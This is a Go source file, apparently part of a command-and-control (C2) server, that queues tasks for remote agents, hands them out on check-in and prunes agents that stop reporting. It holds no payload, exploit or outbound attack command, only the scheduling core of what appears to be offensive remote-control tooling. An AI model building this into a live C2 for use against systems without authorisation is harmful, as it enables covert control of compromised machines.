package c2

import (
	"errors"
	"sync"
	"time"

	commstypes "kingdom/internal/comms/comms_types"
)

type agentKey struct {
	ClientID string
	AgentID  string
}

type AgentState struct {
	Info     *commstypes.Request
	Pending  []*commstypes.Task
	InFlight map[string]*commstypes.Task
	LastSeen time.Time
}

type Scheduler struct {
	mu     sync.RWMutex
	agents map[agentKey]*AgentState
	noop   *commstypes.Task
}

func New() *Scheduler {
	return &Scheduler{
		agents: make(map[agentKey]*AgentState),
		noop:   &commstypes.Task{ID: "noop", Command: "noop", Args: ""},
	}
}

var defaultScheduler = New()

func ScheduleTask(clientID, agentID string, msg any) (*commstypes.Task, error) {
	return defaultScheduler.schedule(clientID, agentID, msg)
}

func QueueTask(clientID, agentID string, task *commstypes.Task) error {
	if task == nil {
		return errors.New("task is nil")
	}
	if task.ID == "" {
		return errors.New("task.ID must be set and unique")
	}
	return defaultScheduler.queueTask(clientID, agentID, task)
}

func ListAgents() []agentKey {
	defaultScheduler.mu.RLock()
	defer defaultScheduler.mu.RUnlock()
	keys := make([]agentKey, 0, len(defaultScheduler.agents))
	for k := range defaultScheduler.agents {
		keys = append(keys, k)
	}
	return keys
}

func (s *Scheduler) getOrCreate(k agentKey) *AgentState {
	state, ok := s.agents[k]
	if !ok {
		state = &AgentState{
			Pending:  make([]*commstypes.Task, 0, 8),
			InFlight: make(map[string]*commstypes.Task),
			LastSeen: time.Now(),
		}
		s.agents[k] = state
	}
	return state
}

func (s *Scheduler) queueTask(clientID, agentID string, task *commstypes.Task) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	k := agentKey{clientID, agentID}
	st := s.getOrCreate(k)

	if _, dup := st.InFlight[task.ID]; dup {
		return errors.New("a task with this ID is already in-flight")
	}
	for _, p := range st.Pending {
		if p.ID == task.ID {
			return errors.New("a task with this ID is already queued")
		}
	}

	st.Pending = append(st.Pending, task)
	return nil
}

func (s *Scheduler) schedule(clientID, agentID string, msg any) (*commstypes.Task, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	k := agentKey{clientID, agentID}
	st := s.getOrCreate(k)
	st.LastSeen = time.Now()

	switch v := msg.(type) {
	case *commstypes.Request:
		st.Info = v
	case *commstypes.TaskResult:
		delete(st.InFlight, v.TaskID)
	default:
		return nil, errors.New("unexpected message type sent to schedule")
	}

	if len(st.Pending) > 0 {
		next := st.Pending[0]
		st.Pending = st.Pending[1:]
		st.InFlight[next.ID] = next
		return next, nil
	}
	return s.noop, nil
}

func (s *Scheduler) prune(inactiveAfter time.Duration) {
	ticker := time.NewTicker(inactiveAfter)
	for range ticker.C {
		now := time.Now()
		s.mu.Lock()
		for k, st := range s.agents {
			if now.Sub(st.LastSeen) > inactiveAfter {
				delete(s.agents, k)
			}
		}
		s.mu.Unlock()
	}
}
